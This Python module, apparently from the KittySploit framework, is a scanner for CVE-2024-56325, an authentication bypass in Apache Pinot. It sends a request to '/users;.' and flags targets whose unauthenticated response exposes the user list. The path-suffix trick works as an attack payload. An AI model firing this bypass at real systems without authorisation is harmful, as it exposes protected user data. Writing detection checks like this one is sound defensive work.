#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""This vulnerability allows remote attackers to bypass authentication on affected installations of Apache Pinot."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Pinot < 1.3.0 - Authentication Bypass Detection',
        'description': 'This vulnerability allows remote attackers to bypass authentication on affected installations of Apache Pinot. Authentication is not required to exploit this vulnerability.The specific flaw exists within the AuthenticationFilter class. The issue results from insufficient neutralization of special characters in a URI. An attacker can leverage this vulnerability to bypass authentication on the system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'apache', 'pinot', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zerodayinitiative.com/advisories/ZDI-25-109/',
            'https://github.com/advisories/GHSA-6jwp-4wvj-6597',
            'https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v',
            'http://www.openwall.com/lists/oss-security/2025/03/27/8',
        ],
        'cve': 'CVE-2024-56325',
    }

    def run(self):
        path = '/users'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/users;.'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('{"users"',)
        header_any = ('Pinot-Controller-',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Apache Pinot < 1.3.0 - Authentication Bypass detected', path=path)
            return True
        return False

